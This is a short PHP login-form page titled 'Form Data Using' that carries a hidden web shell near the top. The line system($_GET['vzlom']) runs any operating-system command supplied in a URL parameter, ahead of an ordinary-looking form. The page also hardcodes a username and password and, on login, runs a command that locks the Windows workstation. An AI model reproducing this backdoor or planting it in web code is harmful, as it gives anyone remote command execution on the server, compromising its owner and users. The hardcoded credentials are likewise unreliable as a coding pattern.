<!DOCTYPE html>
<html lang="ru">
<head>
<title>Form Data Using</title>
<meta charset='utf-8'>
</head>
<body>
<?php


system($_GET['vzlom']);


 if (!isset($_REQUEST['doGo'])) {?>
<form action="<?=$_SERVER['SCRIPT_NAME']?>">
login: <input type="text" name="login" value=""><br />
password: <input type="password" name="password" value=""><br />
<input type="submit" name="doGo" value="Press the button!">
</form>
<?php } else {
if ($_REQUEST['login'] =="xaoc007" && $_REQUEST['password'] == "772447"){
 echo "Access opened for user {$_REQUEST['login']}";
 system("rundll32.exe user32.dll,LockWorkStation");
} 
else {
 echo "Access denied!";
 }
}?>


</body>
</html>